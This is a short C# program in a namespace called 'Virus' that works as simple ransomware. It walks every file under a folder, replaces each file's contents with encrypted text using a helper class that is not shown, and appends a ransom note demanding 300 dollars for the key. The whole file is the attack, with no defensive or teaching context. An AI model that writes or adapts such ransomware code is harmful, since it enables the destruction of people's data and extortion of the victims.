using System;
using System.IO;

namespace Virus
{
	class Program
	{
		static void Main(string[] args)
		{
			string[] allfiles = Directory.GetFiles("C:/test", "*.*", SearchOption.AllDirectories);

			foreach (var file in allfiles)
			{
				string text = File.ReadAllText(file);
				string newText = EncryptionHelper.Encrypt(text);
				File.WriteAllText(file, newText + "\nHAHAHA! ALL YOUR FILES ARE ENCRYPTED!!! PAY 300$ TO GET KEY AND SAVE ALL YOUR FILES");
			}
		}
	}
}
